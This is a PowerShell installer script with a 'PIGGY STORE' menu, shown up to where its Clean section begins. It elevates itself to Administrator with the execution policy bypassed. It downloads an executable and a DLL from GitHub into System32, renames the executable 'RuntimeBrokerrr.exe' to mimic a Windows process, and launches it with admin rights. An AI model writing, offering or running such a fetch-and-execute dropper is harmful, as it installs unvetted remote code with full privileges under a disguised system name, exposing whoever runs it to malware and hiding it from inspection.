# -----------------------------
# Menu Selection
# -----------------------------
Write-Host "Hi Member PIGGY STORE Welcome to CMD | 18/10/2025:"
Write-Host "1. Install & Run"
Write-Host "2. Clean"

$choice = Read-Host "Enter choice (1/2)"

# -----------------------------
# Check for Administrator rights
# -----------------------------
if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) { 
    Write-Host "Restarting with Administrator privileges..."
    Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
    exit
}

# -----------------------------
# Define paths and variables
# -----------------------------
$system32Path = "$env:windir\System32"
$exeDestination = Join-Path $system32Path "RuntimeBrokerrr.exe"
$dllDestination = Join-Path $system32Path "Guna.UI2.dll"


$exeUrl = "https://github.com/ORRYxyz/cccc/raw/main/PIGGY%20POOL%20MODE.exe"
$dllUrl = "https://github.com/NAWINNNNNNNNNNNNNNNNNNNNNNNNNNN/WEBSEA1213/raw/refs/heads/main/Guna.UI2.dll"

# -----------------------------
# Install & Run Mode
# -----------------------------
if ($choice -eq "1") {
    Write-Host "`nStarting installation..."

    # Download DLL first
    Write-Host "Downloading Guna.UI2.dll..."
    try {
        Invoke-WebRequest -Uri $dllUrl -OutFile $dllDestination -UseBasicParsing
        Write-Host "Guna.UI2.dll download completed." -ForegroundColor Green
    } catch {
        Write-Host "Guna.UI2.dll download failed: $_" -ForegroundColor Red
        exit
    }

    # Download exe and place to $exeDestination
    Write-Host "Downloading executable and saving to $exeDestination..."
    try {
        $tempFile = Join-Path $env:TEMP "seanual_temp.exe"
        Invoke-WebRequest -Uri $exeUrl -OutFile $tempFile -UseBasicParsing
        Move-Item -Path $tempFile -Destination $exeDestination -Force
        Write-Host "Executable download completed." -ForegroundColor Green
    } catch {
        Write-Host "Executable download failed: $_" -ForegroundColor Red
        exit
    }

    # Run the program directly
    Write-Host "Starting the program..."
    try {
        Start-Process -FilePath $exeDestination -Verb RunAs
        Write-Host "Program started successfully." -ForegroundColor Green
    } catch {
        Write-Host "Failed to start program: $_" -ForegroundColor Red
    }

    Write-Host "`nInstallation completed successfully." -ForegroundColor Green
}

# -----------------------------
# Clean Mode
# -------------------------
